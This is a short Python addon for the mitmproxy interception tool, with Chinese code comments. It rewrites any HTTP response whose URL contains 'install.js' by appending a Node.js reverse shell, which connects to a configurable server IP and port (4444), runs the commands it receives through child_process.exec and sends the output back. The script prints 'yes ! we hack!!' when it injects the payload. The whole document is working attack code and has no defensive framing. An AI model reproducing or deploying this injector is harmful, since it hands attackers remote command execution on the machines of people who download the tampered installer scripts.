from mitmproxy import http

evil_rce = '''const net = require('net');
const { exec } = require('child_process');

const HOST = '127.0.0.1'; // 替换为服务端IP
const PORT = 4444;        // 替换为服务端端口

const client = new net.Socket();

client.connect(PORT, HOST, () => {
    console.log('Connected to server');
});

client.on('data', (data) => {
    const command = data.toString().trim();

    if (command === 'exit') {
        client.destroy(); // 关闭连接
        process.exit(0);  // 退出程序
    }

    // 执行命令
    exec(command, (error, stdout, stderr) => {
        if (error) {
            client.write(`Error: ${error.message}\n`);
            return;
        }
        if (stderr) {
            client.write(`Stderr: ${stderr}\n`);
            return;
        }
        client.write(stdout);
    });
});

client.on('close', () => {
    console.log('Connection closed');
    process.exit(0);
});
'''

def response(flow: http.HTTPFlow) -> None:
    if "install.js" in flow.request.pretty_url:
        print("yes ! we hack!!")
        flow.response.status_code = 200
        flow.response.text = flow.response.text + evil_rce
